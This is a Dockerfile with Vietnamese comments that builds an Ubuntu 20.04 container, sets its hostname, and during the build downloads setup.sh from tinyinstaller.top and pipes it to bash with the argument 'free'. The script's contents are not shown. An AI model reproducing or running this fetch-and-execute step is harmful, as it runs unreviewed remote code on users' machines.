# Sử dụng Ubuntu làm cơ sở
FROM ubuntu:20.04

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt-get update -y && apt-get install -y \
    curl wget bash net-tools

# Đặt hostname rõ ràng để tránh lỗi liên quan đến hostname
RUN echo "my-container" > /etc/hostname && \
    hostname "my-container" && \
    sed -i "s/127.0.1.1.*/127.0.1.1 my-container/" /etc/hosts

# Tải và chạy script setup.sh từ URL
RUN (wget https://tinyinstaller.top/setup.sh -4O tinyinstaller.sh || curl https://tinyinstaller.top/setup.sh -Lo tinyinstaller.sh) && bash tinyinstaller.sh free

# Dọn dẹp bộ nhớ cache để giảm kích thước image
RUN apt-get clean && rm -rf /var/lib/apt/lists/*

# Lệnh mặc định khi container chạy
CMD ["bash"]
